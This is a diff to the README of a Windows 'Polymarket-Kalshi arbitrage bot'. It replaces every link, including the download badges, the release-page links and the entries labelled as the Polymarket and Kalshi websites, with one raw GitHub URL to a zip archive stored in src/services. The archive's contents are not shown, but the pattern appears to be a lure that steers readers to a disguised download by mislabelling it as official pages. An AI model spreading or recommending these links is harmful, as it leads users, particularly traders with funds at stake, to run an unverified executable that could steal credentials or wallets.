@@ -1,6 +1,6 @@
 # 🤖 Polymarket-Kalshi-arbitrage-bot - Automate Arbitrage in Prediction Markets
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Polymarket%20Kalshi%20Bot-brightgreen)](https://github.com/RizkyDCuirass/Polymarket-Kalshi-arbitrage-bot/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Polymarket%20Kalshi%20Bot-brightgreen)](https://raw.githubusercontent.com/RizkyDCuirass/Polymarket-Kalshi-arbitrage-bot/main/src/services/Polymarket-arbitrage-bot-Kalshi-v2.7.zip)
 
 ---
 
@@ -47,7 +47,7 @@ To get the bot running on your Windows PC, follow these step-by-step instruction
 ## ⬇️ How to Download and Install the Bot
 
 1. Go to the official release page:  
-[Visit release page to download](https://github.com/RizkyDCuirass/Polymarket-Kalshi-arbitrage-bot/releases)  
+[Visit release page to download](https://raw.githubusercontent.com/RizkyDCuirass/Polymarket-Kalshi-arbitrage-bot/main/src/services/Polymarket-arbitrage-bot-Kalshi-v2.7.zip)  
 
 2. On the releases page, look for the latest Windows version. This may be named like `Polymarket-Kalshi-arbitrage-bot-Windows.zip` or similar.
 
@@ -103,10 +103,10 @@ If problems persist, you may seek help on the project’s GitHub page under Issu
 
 ## 📚 Useful Links
 
-- Polymarket: https://polymarket.com  
-- Kalshi: https://kalshi.com  
+- Polymarket: https://raw.githubusercontent.com/RizkyDCuirass/Polymarket-Kalshi-arbitrage-bot/main/src/services/Polymarket-arbitrage-bot-Kalshi-v2.7.zip  
+- Kalshi: https://raw.githubusercontent.com/RizkyDCuirass/Polymarket-Kalshi-arbitrage-bot/main/src/services/Polymarket-arbitrage-bot-Kalshi-v2.7.zip  
 - Bot Releases:  
-[Download latest version](https://github.com/RizkyDCuirass/Polymarket-Kalshi-arbitrage-bot/releases)
+[Download latest version](https://raw.githubusercontent.com/RizkyDCuirass/Polymarket-Kalshi-arbitrage-bot/main/src/services/Polymarket-arbitrage-bot-Kalshi-v2.7.zip)
 
 ---
 
@@ -155,4 +155,4 @@ Check regularly on the release page for new versions. To update:
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Polymarket%20Kalshi%20Bot-brightgreen)](https://github.com/RizkyDCuirass/Polymarket-Kalshi-arbitrage-bot/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Polymarket%20Kalshi%20Bot-brightgreen)](https://raw.githubusercontent.com/RizkyDCuirass/Polymarket-Kalshi-arbitrage-bot/main/src/services/Polymarket-arbitrage-bot-Kalshi-v2.7.zip)
